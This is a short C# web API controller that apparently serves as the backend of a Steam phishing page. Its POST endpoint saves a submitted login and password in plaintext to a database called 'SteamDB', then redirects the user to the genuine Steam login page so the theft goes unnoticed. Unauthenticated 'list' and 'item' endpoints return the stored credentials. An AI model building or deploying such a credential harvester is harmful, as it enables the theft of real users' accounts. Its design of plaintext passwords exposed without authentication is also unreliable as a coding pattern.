using WebServer.Attributes;
using System.Data.SqlClient;
using System.Net;

namespace WebServer.Controllers
{
    [ApiController]
    public class Accounts
    {
        [HttpGET("list")]
        public List<Account> GetAccounts()
        {
            var db = new MyORM(@"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True;");
            return db.Select<Account>();
        }

        [HttpGET("item")]
        public Account GetAccountById(int id)
        {
            var db = new MyORM(@"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True;");
            return db.Select<Account>(id);

        }

        [HttpPOST("post")]
        public void SaveAccounts(string login, string password, HttpListenerResponse response)
        {
            var db = new MyORM(@"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True;");
            db.Insert(new Account() { Login = login, Password = password });
            response.Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }
    }

    public class Account
    {
        public int Id { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
}
